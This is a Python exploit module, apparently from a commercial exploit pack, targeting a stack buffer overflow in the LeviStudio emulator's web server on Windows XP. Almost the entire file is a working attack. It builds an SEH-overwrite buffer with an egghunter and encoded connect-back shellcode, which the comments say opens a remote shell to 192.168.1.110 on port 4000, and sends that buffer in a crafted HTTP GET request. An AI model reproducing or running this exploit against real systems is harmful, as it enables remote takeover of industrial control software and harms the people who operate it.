#!/usr/bin/env python
# The exploit is a part of Agora pack - use only under the license agreement
# specified in LICENSE.txt in your Agora distribution
# immunity debugger !mona egg -t EaST

import sys
import re
import os
import socket
import struct
sys.path.append("./core")
from Sploit import Sploit

INFO={}
INFO['NAME']="ef_levistudio_SBO"
INFO['DESCRIPTION']="Levi Studio Emulator Stack buffer overflow"
INFO['VENDOR']="http://www.we-con.com.cn/en/down/list_35_1.html"
INFO["CVE Name"]="0-day"
INFO["NOTES"]="""
Originally published by Gleg team in 01.01.2015
    stack buffer overflow vulnerability in default web server
    tested on Win xp SP1 En LeviStudioU Release Build 2015-08-03 V1.7.22
    """
INFO['CHANGELOG']="21 Sept, 2015. Written by Gleg team."
INFO['PATH'] = "Exploits/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.255"
OPTIONS["PORT"] = "80"

class exploit(Sploit):
    def __init__(self,host="",
                port=0, 
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.host=host
        self.port = port
        self.name = INFO['NAME']
        self.state = "running"
        return

    def get_args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return

    def check(self):
        self.get_args()
        """
          Quicky banner check
        """
        self.log( "Testing %s:%d" % ( self.host, int(self.port) ) )
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
        except socket.error, msg:
            self.log("Error : %s"%msg)
            return 0
        s.close()
        return 1

    def run(self):
        if not self.check():
            self.log( "Testing didn't find vulnerable target" )
            self.finish(False)
            return 0
        BADCHARS = ["\x00", "\x09", "\x0A", "\x0E", "\x0D" "\x1A", "\x20", "\x23", "\x2B", "\x3F", "\x5C", "\xFF"]
        # egg.bin | msfencode -a x86 -p windows -b '\x00\x09\x0A\x0E\x1A\x20\x23\x2B\x3F\x5C\xFF'
        #egg serach a tag EaST 54 bytes
        egg =  ""
        egg += "\x6a\x08\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
        egg += "\xf7\x80\xa7\x3c\x83\xeb\xfc\xe2\xf4\x91\x01\x6d\xc3"
        egg += "\xf8\xc2\xf5\x56\xf5\xd8\x6a\x12\xcb\x85\xfd\x48\x18"
        egg += "\x38\xe2\x5d\xa4\xd4\x2c\xc6\x58\xf5\x4d\x93\x82\x67"
        egg += "\x58\xdb"
        # msfvenom connect back shellcode encoded with bad chars 
        # connect back address 192.168.1.110 port 4000 346 bytes
        buf =  ""
        buf += "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
        buf += "\xa1\x99\x27\x30\x83\xeb\xfc\xe2\xf4\x5d\x71\xa5\x30"
        buf += "\xa1\x99\x47\xb9\x44\xa8\xe7\x54\x2a\xc9\x17\xbb\xf3"
        buf += "\x95\xac\x62\xb5\x12\x55\x18\xae\x2e\x6d\x16\x90\x66"
        buf += "\x8b\x0c\xc0\xe5\x25\x1c\x81\x58\xe8\x3d\xa0\x5e\xc5"
        buf += "\xc2\xf3\xce\xac\x62\xb1\x12\x6d\x0c\x2a\xd5\x36\x48"
        buf += "\x42\xd1\x26\xe1\xf0\x12\x7e\x10\xa0\x4a\xac\x79\xb9"
        buf += "\x7a\x1d\x79\x2a\xad\xac\x31\x77\xa8\xd8\x9c\x60\x56"
        buf += "\x2a\x31\x66\xa1\xc7\x45\x57\x9a\x5a\xc8\x9a\xe4\x03"
        buf += "\x45\x45\xc1\xac\x68\x85\x98\xf4\x56\x2a\x95\x6c\xbb"
        buf += "\xf9\x85\x26\xe3\x2a\x9d\xac\x31\x71\x10\x63\x14\x85"
        buf += "\xc2\x7c\x51\xf8\xc3\x76\xcf\x41\xc6\x78\x6a\x2a\x8b"
        buf += "\xcc\xbd\xfc\xf1\x14\x02\xa1\x99\x4f\x47\xd2\xab\x78"
        buf += "\x64\xc9\xd5\x50\x16\xa6\x66\xf2\x88\x31\x98\x27\x30"
        buf += "\x88\x5d\x73\x60\xc9\xb0\xa7\x5b\xa1\x66\xf2\x60\xf1"
        buf += "\xc9\x77\x70\xf1\xd9\x77\x58\x4b\x96\xf8\xd0\x5e\x4c"
        buf += "\xb0\x5a\xa4\xf1\xe7\x98\xa0\xf7\x4f\x32\xa1\x96\x87"
        buf += "\xb9\x47\xf3\x37\x66\xf6\xf1\xbe\x95\xd5\xf8\xd8\xe5"
        buf += "\x24\x59\x53\x3c\x5e\xd7\x2f\x45\x4d\xf1\xd7\x85\x03"
        buf += "\xcf\xd8\xe5\xc9\xfa\x4a\x54\xa1\x10\xc4\x67\xf6\xce"
        buf += "\x16\xc6\xcb\x8b\x7e\x66\x43\x64\x41\xf7\xe5\xbd\x1b"
        buf += "\x31\xa0\x14\x63\x14\xb1\x5f\x27\x74\xf5\xc9\x71\x66"
        buf += "\xf7\xdf\x71\x7e\xf7\xcf\x74\x66\xc9\xe0\xeb\x0f\x27"
        buf += "\x66\xf2\xb9\x41\xd7\x71\x76\x5e\xa9\x4f\x38\x26\x84"
        buf += "\x47\xcf\x74\x22\xd7\x85\x03\xcf\x4f\x96\x34\x24\xba"
        buf += "\xcf\x74\xa5\x21\x4c\xab\x19\xdc\xd0\xd4\x9c\x9c\x77"
        buf += "\xb2\xeb\x48\x5a\xa1\xca\xd8\xe5"
        buf += '\x90' * (4 - len(buf)%4)
        egg += '\x90' * (4 - len(egg)%4)
        buffer = 3000
        buff = '\x90\x90\x90\x90EaSTEaST'
        buff += buf
        buff += '\x90' * (752 - len(buf) - len(egg))
        buff += egg
        buff += '\x90'*4
        buff += '\xEB\x80\x90\x90' # nseh back jump
        buff += '\x86\x6A\xE1\x77' # seh xp sp1 EN '\x86\x6A\xE0\x77'# seh xp sp1 RU 
        buff += '\x90' * (buffer - len(buff))
        crash="GET /"+"%uc0c0c0c0"+buff+" HTTP/1.0\r\n\r\n"
        try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((self.host,int(self.port)))
          s.sendall(crash)
          s.close()
        except socket.error, exc:
          print("Caught exception socket.error : %s" % exc)
          self.log("Attack reported no open socket - service died?")
          return 0
        self.finish(True)
        return 1
if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()